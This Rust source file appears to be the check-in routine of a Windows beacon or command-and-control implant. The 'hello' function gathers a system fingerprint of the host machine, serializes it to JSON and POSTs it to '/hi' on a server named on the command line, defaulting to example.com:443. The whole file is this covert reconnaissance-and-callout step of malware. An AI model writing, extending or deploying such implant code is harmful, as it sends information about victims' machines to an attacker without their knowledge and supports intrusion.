mod beacon;
mod collector;

use std::collections::HashMap;

use beacon::Beacon;
use beacon::client::Request;
use collector::SystemFingerprint;
use windows::core::Result;

pub fn hello() -> Result<()> {
    let data = SystemFingerprint::collect()?;
    let data_json = serde_json::to_string(&data).unwrap_or("Serialization error".to_string());
    let mut comm = Beacon::new()?;

    let args = std::env::args()
        .nth(1)
        .unwrap_or(String::from("example.com:443"));
    let home: Vec<&str> = args.split(":").collect();

    let hostname = home[0];
    let port: u16 = home[1].parse().unwrap_or(443);

    let mut headers: HashMap<String, String> = HashMap::new();
    headers.insert("Content-Type".to_string(), "application/json".to_string());

    let request = Request::new(
        hostname,
        port,
        "POST",
        "/hi",
        Some(&headers),
        Some(data_json.as_str()),
    );

    comm.request(&request)?;

    Ok(())
}
